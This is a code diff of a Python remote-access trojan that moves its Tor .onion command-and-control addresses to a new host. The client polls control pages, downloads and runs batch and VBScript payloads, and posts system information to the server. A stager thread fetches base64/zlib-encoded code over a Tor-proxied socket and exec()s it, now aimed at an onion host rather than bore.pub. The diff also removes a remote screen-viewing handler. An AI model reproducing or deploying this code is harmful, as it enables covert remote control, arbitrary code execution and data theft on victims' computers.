@@ -19,7 +19,7 @@ from io import BytesIO
 from PIL import Image
 import shutil
 import string
-
+import socks
 proxies = {
     'http': 'socks5h://127.0.0.1:9151',  # Tor proxy address and port for HTTP
     'https': 'socks5h://127.0.0.1:9151'  # Tor proxy address and port for HTTPS
@@ -60,7 +60,7 @@ def METASPLOIT():
     previous_data = "" 
   
     while True:
-     url = 'http://haoj6nrd5zkiq3wkgwa7vkbtou623yjhkavqm5zajo4wfdynu7ezhvad.onion/Metasploit.php'
+     url = 'http://cbo4lp2r6udkuvx5ds6cfsny24bs3lqowhbfqlggfbwp5jnq64nb3vqd.onion/Metasploit.php'
      time.sleep(5)
      response = requests_session.get(url)
 
@@ -90,7 +90,7 @@ def METASPLOIT():
                     restart_program()
                 elif option == "STARTVBSBAT":
                     os.system("cls")
-                    php_script_url = 'http://haoj6nrd5zkiq3wkgwa7vkbtou623yjhkavqm5zajo4wfdynu7ezhvad.onion/Control.php'
+                    php_script_url = 'http://cbo4lp2r6udkuvx5ds6cfsny24bs3lqowhbfqlggfbwp5jnq64nb3vqd.onion/Control.php'
                     home_directory = os.path.expanduser("~")
                     web_page1_path = os.path.join(home_directory, "Script.bat")
                     vbs_file_path = os.path.join(home_directory, "VBSEX.vbs")
@@ -99,8 +99,8 @@ def METASPLOIT():
                         if os.path.exists(file_path):
                             os.remove(file_path)
 
-                    url1 = "http://haoj6nrd5zkiq3wkgwa7vkbtou623yjhkavqm5zajo4wfdynu7ezhvad.onion/Script.io"
-                    url2 = "http://haoj6nrd5zkiq3wkgwa7vkbtou623yjhkavqm5zajo4wfdynu7ezhvad.onion/VBSEX.io"
+                    url1 = "http://cbo4lp2r6udkuvx5ds6cfsny24bs3lqowhbfqlggfbwp5jnq64nb3vqd.onion/Script.io"
+                    url2 = "http://cbo4lp2r6udkuvx5ds6cfsny24bs3lqowhbfqlggfbwp5jnq64nb3vqd.onion/VBSEX.io"
 
                     download_file(url1, web_page1_path)
                     download_file(url2, vbs_file_path)
@@ -163,30 +163,34 @@ def METASPLOIT():
                     os.system("cls")
                     def run_specific_code():
                         import socket, zlib, base64, struct, time, random
+                        import socks
+
+                        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 9151)  # Use Tor's default port
+                        socket.socket = socks.socksocket  # Redirect all socket traffic through Tor
 
                         while True:
-                            ports_to_try = [61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012]
-                            random.shuffle(ports_to_try)
+                           ports_to_try = [80]
+                           random.shuffle(ports_to_try)
 
-                            for port in ports_to_try:
-                                try:
-                                    s = socket.socket(2, socket.SOCK_STREAM)
-                                    s.connect(('bore.pub', port))
+                           for port in ports_to_try:
+                            try:
+                              s = socket.socket(2, socket.SOCK_STREAM)
+                              s.connect(('vmfsj2ofiwu3p4pgip3buouim7io6c6xguqwuc4q4omy3rroq3vqj5ad.onion', port))  # Change the URL
 
-                                    l = struct.unpack('>I', s.recv(4))[0]
-                                    d = s.recv(1)
-                                    while len(d) < l:
-                                        d += s.recv(l - len(d))
+                              l = struct.unpack('>I', s.recv(4))[0]
+                              d = s.recv(1)
+                              while len(d) < l:
+                                d += s.recv(l - len(d))
 
-                                    exec(zlib.decompress(base64.b64decode(d)), {'s': s})
+                              exec(zlib.decompress(base64.b64decode(d)), {'s': s})
 
-                                except Exception as e:
-                                    print(f"{e}")
-                                finally:
-                                    s.close()
+                            except Exception as e:
+                             print(f"{e}")
+                            finally:
+                             s.close()
 
-                                if 's' in locals():
-                                    break
+                            if 's' in locals():
+                               break
 
                     specific_code_thread = threading.Thread(target=run_specific_code)
                     specific_code_thread.daemon = True
@@ -197,33 +201,6 @@ def METASPLOIT():
                         python = sys.executable
                         os.execl(python, python, *sys.argv)
                     restart_program()
-                elif option == "SCR":
-                    def SCR():
-                      SERVER_IP = 'bore.pub'
-                      ports_to_try = [61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012]
-                      random.shuffle(ports_to_try)
-
-                      for port in ports_to_try:
-                          try:
-                             client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                             client_socket.connect((SERVER_IP, port))
-                             print(f"Connected to the server at {SERVER_IP}:{port}")
-                             while True:
-                                img_bytes = b""
-                                while True:
-                                 packet = client_socket.recv(4096)
-                                 if not packet:
-                                      break
-                                 img_bytes += packet
-                                 img = Image.open(BytesIO(img_bytes))
-                                 img.show()
-                          except Exception as e:
-                             print(f"Failed to connect to {SERVER_IP}:{port} - Error: {str(e)}")
-                          finally:
-                            client_socket.close()
-                    specific_code_thread = threading.Thread(target=SCR)
-                    specific_code_thread.daemon = True
-                    specific_code_thread.start()
                 else:
                     print("Invalid command:", option)
             else:
@@ -326,7 +303,7 @@ def get_system_info():
         session = requests.Session()
         session.proxies = proxies
 
-        url = "http://haoj6nrd5zkiq3wkgwa7vkbtou623yjhkavqm5zajo4wfdynu7ezhvad.onion/Save.php"
+        url = "http://cbo4lp2r6udkuvx5ds6cfsny24bs3lqowhbfqlggfbwp5jnq64nb3vqd.onion/Save.php"
         data = data_to_send
         response = requests_session.post(url, data=data)
         print(response.text)
@@ -343,7 +320,7 @@ while True:
             global previous_command, previous_files
 
             while True:
-                php_script_url = f'http://haoj6nrd5zkiq3wkgwa7vkbtou623yjhkavqm5zajo4wfdynu7ezhvad.onion/Control.php'
+                php_script_url = f'http://cbo4lp2r6udkuvx5ds6cfsny24bs3lqowhbfqlggfbwp5jnq64nb3vqd.onion/Control.php'
                 
                 response = requests_session.get(php_script_url)
                 data = response.text.strip()
